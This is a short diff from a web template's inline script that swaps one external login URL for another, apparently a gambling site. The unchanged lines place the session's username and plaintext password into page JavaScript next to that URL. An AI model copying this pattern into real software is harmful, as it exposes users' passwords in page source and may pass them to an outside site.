@@ -113,7 +113,7 @@
 <script>
   var errorMessage = @json(session('error'));
   var successMessage = @json(session('success'));
-  var url = 'https://maxwinagent.online/login';
+  var url = 'https://superbet7.info/login';
   var name = @json(session('username'));
   var pw = @json(session('password'));
 
